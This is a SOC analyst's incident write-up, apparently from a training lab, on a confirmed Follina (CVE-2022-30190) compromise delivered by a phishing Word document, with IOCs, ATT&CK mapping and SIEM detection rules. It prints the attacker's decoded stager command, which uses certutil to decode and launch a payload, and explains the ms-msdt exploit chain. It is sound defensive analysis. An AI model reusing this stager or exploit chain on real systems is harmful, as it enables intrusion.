
# SOC173 - Follina 0-Day Detected (CVE-2022-30190) 

## 🚨 Raw Alert Details
```text
EventID : 123
Event Time : Jun, 02, 2022, 03:22 PM
Rule : SOC173 - Follina 0-Day Detected
Level : Security Analyst
Hostname : JonasPRD
Source Address : 172.16.17.39
File Name : 05-2022-0438.doc
File Hash : 52945af1def85b171870b31fa4782e52
File Size : 10.01 Kb
AV Action : Allowed
Trigger Reason : msdt.exe executed after Office document
```

## Alert Overview
- **Severity:** Critical
- **Detection Source:** EDR / AV
- **Asset Affected:** JonasPRD (172.16.17.39)
- **Threat Type:** Zero-Day / Remote Code Execution (RCE) / Living off the Land (LotL)
- **Status:** True Positive (Compromised)

## 🧠 Deep Dive: Understanding "Follina" (CVE-2022-30190)
**Follina** is a critical Remote Code Execution (RCE) vulnerability in the Microsoft Windows Support Diagnostic Tool (MSDT). 

**The Mechanics:** Threat actors deliver a weaponized Microsoft Word document. Unlike traditional attacks, Follina does **not** rely on Visual Basic (VBA) macros. Instead, it exploits a native feature in Word called OLE Object External Linking. The attacker modifies the `word/_rels/document.xml.rels` file inside the `.doc` archive to point to an external malicious HTML file.

When Word parses the document (even if just viewed in the Windows Explorer "Preview Pane"), it fetches the external HTML file. This HTML file contains JavaScript that invokes the `ms-msdt:/` URI protocol. Because `msdt.exe` processes parameters unsafely, the attacker can pass a massive, Base64-encoded PowerShell command to it. The diagnostic tool then passes execution to `sdiagnhost.exe` (Scripted Diagnostics Host), which executes the attacker's payload, completely bypassing standard macro security and Application Whitelisting.

## Investigation Steps

### 1. Initial Access Verification (Phishing)
The investigation began by determining how the weaponized document (`05-2022-0438.doc`) arrived on the endpoint.
- **Email Security Check:** Found an email sent to `jonas@letsdefend.io` from `radiosputnik@ria.ru`. 
- **Lure:** "Invitation for an interview on Sputnik Radio," urging the victim to open the attached, password-protected ZIP archive (`Password: infected`).
- **Analyst Note:** Delivering malware inside a password-protected ZIP archive is a deliberate Defense Evasion tactic. It prevents the Secure Email Gateway (SEG) from unzipping and hashing the `.doc` file in transit, allowing the payload to land safely in the user's inbox.


<img width="1511" height="437" alt="image" src="https://github.com/user-attachments/assets/72e7e4b0-2f52-49fe-9933-93c7d2cb60a6" />


### 2. Network C2 Validation
Network connection logs from the endpoint were cross-referenced to find the external HTML template server referenced by the Follina exploit.
- **Finding:** The endpoint established outbound HTTPS (Port 443) connections to `141.105.65.149`.
- **Raw Log Analysis:** The HTTP GET request targeted `https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html`. 
- **Threat Intelligence:** VirusTotal flagged `xmlformats.com` (12/91) as a malicious domain specifically created to host Follina `.html` payloads. The domain name is designed to masquerade as a legitimate Microsoft XML formatting schema to blend in with normal web traffic.

<img width="1577" height="507" alt="image" src="https://github.com/user-attachments/assets/d5c2227a-aeae-49ff-98f2-0385b3058c1c" />

<img width="1806" height="245" alt="image" src="https://github.com/user-attachments/assets/2cefd764-0ef8-42df-a457-36eb3c176125" />



### 3. Execution and Process Lineage (EDR)
To confirm if the Follina exploit triggered successfully on the endpoint, the EDR logs for the host `JonasPRD` were analyzed.
- **Process History:** The process tree revealed the exact behavioral signature of CVE-2022-30190: `WINWORD.exe` executed, followed immediately by `msdt.exe`, which then spawned `sdiagnhost.exe` and `cmd.exe`.
- **Command Line Extraction:** The EDR captured `msdt.exe` receiving a massive, Base64-encoded string wrapped in an `Invoke-Expression` PowerShell block, confirming the vulnerability was successfully triggered by the Word document.

<img width="1160" height="505" alt="image" src="https://github.com/user-attachments/assets/8de5ca45-12a4-4348-a7b2-1a2bbc47914d" />


### 4. Payload Delivery & Execution (Living off the Land)
The Terminal History on the endpoint exposed the fully decoded payload executed by `cmd.exe`:
- **Payload 1 (The Stager):** 
  `C:/windows/system32/cmd.exe /c cd C:/users/public/&&for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&findstr TVNDRgAAAA 1.rar>1.t&&certutil -decode 1.t 1.c &&expand 1.c -F:* .&&rgb.exe`
  - *Deconstruction:* The script searches the `%temp%` directory for the downloaded archive. It uses `findstr` to locate a specific Base64 blob (starting with `TVNDR` - the magic bytes for a CAB file). It uses the native Windows tool `certutil` to decode the payload, extracts it using `expand`, and executes the final malware: `rgb.exe`.
- **Payload 2 (Cleanup):** 
  `C:/windows/system32/cmd.exe /c taskkill /f /im msdt.exe`
  - *Deconstruction:* The attacker kills the diagnostic tool process immediately after execution. This closes the visible Windows "Troubleshooter" pop-up window, keeping the user unaware that an exploit just occurred.

<img width="1177" height="317" alt="image" src="https://github.com/user-attachments/assets/7c770472-8710-4608-a509-e6c0fd457ecf" />


## Analysis and Findings
The incident is a confirmed **True Positive**. The user "Jonas" received a spear-phishing email containing a password-protected ZIP. Upon extracting and opening the Word document, the Follina (CVE-2022-30190) vulnerability was triggered. The exploit successfully fetched an external HTML payload from `xmlformats.com`, launched the Microsoft Diagnostic Tool (`msdt.exe`), and utilized Living off the Land (LotL) binaries (`certutil.exe`) to decode and execute a secondary executable (`rgb.exe`). The endpoint is fully compromised.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Initial Access** | T1566.001 | Phishing: Spearphishing Attachment |
| **Execution** | T1203 | Exploitation for Client Execution (CVE-2022-30190) |
| **Defense Evasion** | T1218.011 | System Binary Proxy Execution: Rundll32/MSDT |
| **Defense Evasion** | T1140 | Deobfuscate/Decode Files or Information (`certutil -decode`) |
| **Command and Control** | T1071.001 | Application Layer Protocol: Web Protocols |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| Domain | `xmlformats.com` | Follina HTML Payload Hosting Domain |
| IP Address | 141.105.65.149 | Attacker Infrastructure |
| URL | `https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html` | Malicious Follina Template |
| File Name | `rgb.exe` | Decoded Secondary Payload |
| Hash (MD5) | `52945af1def85b171870b31fa4782e52` | Malicious Initial `.doc` File |
| Email | `radiosputnik@ria.ru` | Phishing Sender Address |

## 🌫️ Blind Spots
- **Secondary Payload Intent:** The analysis confirms `rgb.exe` was decoded and executed. However, without reverse-engineering `rgb.exe` in a dedicated malware sandbox, its ultimate intent (e.g., Ransomware deployment, InfoStealer, Cobalt Strike beacon) cannot be definitively confirmed from EDR logs alone.
- **Encrypted C2:** The initial HTML template was fetched over HTTPS (Port 443). Without SSL decryption at the perimeter, the exact contents of `RDF842l.html` could not be inspected on the wire.

## 🚫 False Positives: Legitimate Activity Comparison
- `msdt.exe` (Microsoft Support Diagnostic Tool) running on a workstation is completely normal when an IT administrator or user is actively troubleshooting a network or software issue. 
- **The Differentiator:** `msdt.exe` is **never** legitimately spawned as a child process of Microsoft Word (`WINWORD.EXE`). Any instance of an Office application spawning a diagnostic tool is inherently malicious.

## ⚖️ Mistakes and Lessons Learned
- **Analyst Reflection (Dynamic Analysis Limitation):** My initial instinct was to take the `.doc` file and run it in an online sandbox like Any.Run to watch the exploit detonate dynamically. However, the sandbox execution failed to produce any malicious behavior.
- **The Lesson (Dead Infrastructure):** This incident highlights the limitation of relying entirely on dynamic sandboxing. Because the incident occurred in the past, the attacker's server (`xmlformats.com`) had already been taken offline. When the `.doc` file tried to fetch the HTML template, it received a 404/Timeout error, causing the exploit chain to fail in the sandbox. This reinforces the necessity of knowing how to manually trace EDR and Terminal logs to prove execution, rather than relying solely on automated sandbox videos.

## 🛠️ Detection Engineering & Hunting Logic
To improve automated detection of the Follina attack chain, the following logic should be implemented in the SIEM:
- **Detection 1 (Process Lineage Anomaly):** Alert when `ParentImage="*\WINWORD.EXE" OR "*\EXCEL.EXE" OR "*\OUTLOOK.EXE"` AND `Image="*\msdt.exe"`.
- **Detection 2 (LOLBin Decoding):** Alert when `Image="*\certutil.exe"` AND `CommandLine Contains "-decode"`.
- **Detection 3 (MSDT Suspicious Arguments):** Alert when `Image="*\msdt.exe"` AND `CommandLine Contains "IT_RebrowseForFile="` AND `CommandLine Contains "Invoke-Expression" OR "IT_BrowseForFile="`.

## 🚀 Decision Tree for OLE / MSDT Exploits
1. **Analyze Initial Vector:** Did the user receive an Office document or an RTF file?
2. **Check Process Lineage:** Did the Office application spawn `msdt.exe`?
   - If Yes -> High probability of CVE-2022-30190.
3. **Analyze Terminal History:** Did `sdiagnhost.exe` or `cmd.exe` execute encoded PowerShell, `certutil`, or `expand` commands immediately following the `msdt` launch?
   - If Yes -> **Verdict: True Positive - Successful RCE.**
4. **Action:** Isolate host, terminate `msdt.exe` and any child processes, and initiate incident response.

## Response and Closure
- **Action Taken:** The compromised endpoint (`JonasPRD / 172.16.17.39`) was immediately **Isolated** from the network to halt secondary payload execution. The malicious email was deleted from the Exchange server. The payload domain (`xmlformats.com`) was added to the perimeter blocklist.
- **Containment Required:** Yes.
- **Closure Reason:** True Positive. Successful Zero-Day RCE exploitation (Follina).

## Recommendations
1. **Follina Mitigation (Registry Key):** If Microsoft security patches cannot be applied immediately, implement the Microsoft-recommended workaround by disabling the MSDT URL protocol via Group Policy or Registry modification: `reg delete HKEY_CLASSES_ROOT\ms-msdt /f`.
2. **ASR Rules:** Enable the Microsoft Defender Attack Surface Reduction (ASR) rule: *"Block all Office applications from creating child processes."* This would have halted the execution chain between Word and the diagnostic tool.
3. **Forensic Audit:** A complete forensic sweep of JonasPRD must be conducted to determine the capabilities of the dropped `rgb.exe` binary.

## 🛠️ Skills & Tools Used
- **EDR Process Tree Analysis:** Identifying anomalous parent-child relationships (`WINWORD.exe` -> `msdt.exe`).
- **Terminal Forensics:** Deconstructing complex command-line chains and "Living off the Land" (LotL) techniques (`certutil`, `findstr`, `expand`).
- **Vulnerability Triage:** Understanding the mechanics of external HTML template injection (CVE-2022-30190).
- **Network Log Correlation:** Validating outbound HTTPS connections to exploit delivery domains.
